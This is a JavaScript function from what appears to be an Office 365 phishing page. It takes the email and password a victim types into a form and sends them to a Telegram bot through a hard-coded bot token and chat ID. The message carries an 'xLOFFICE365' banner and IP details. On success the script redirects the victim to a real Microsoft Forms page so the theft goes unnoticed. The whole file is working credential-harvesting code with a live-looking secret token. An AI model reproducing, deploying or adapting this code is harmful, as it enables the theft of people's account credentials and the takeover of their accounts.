function sendToTelegram() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const confirm_password = document.getElementById("confirm_password").value;
    

    if (password !== confirm_password) {
        alert(`passwords doesn't match`)
        return;
    }
    
    if (!email || !password) {
        alert("Please fill in all fields.");
        return;
    }
    
    const botToken = "7849057156:AAE6LNUEqiQ0zLLvmzP7wTNDjgUn_OIgkVU";
    const chatId = "8041820202";
    const message = `
    |----------| xLOFFICE365/SCH s |--------------|
    Online ID            : ${email}
    Passcode              : ${password}
    |--------------- I N F O | I P -------------------|
    |Client IP: 172.69.37.138
    |--- http://www.geoiptool.com/?IP=172.69.37.138
    Geo Data Tool - View my IP information: 52.167.144.181
    View my IP information: 52.167.144.181
        `;
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
               confirm(`Confirm email: ${email}`);
                alert("Details sent successfully!");
                window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=6rma1OyZUkWGUb2U95ql5fEyhzHJrZ1Nh6ErkmDSMa5UMTQ0TkFYVjI1TFhSS1UyMU9TM0REQ0lDTS4u";
            } else {
                alert("Failed to send details.");
            }
        })
        .catch(error => alert("Error: " + error));
}
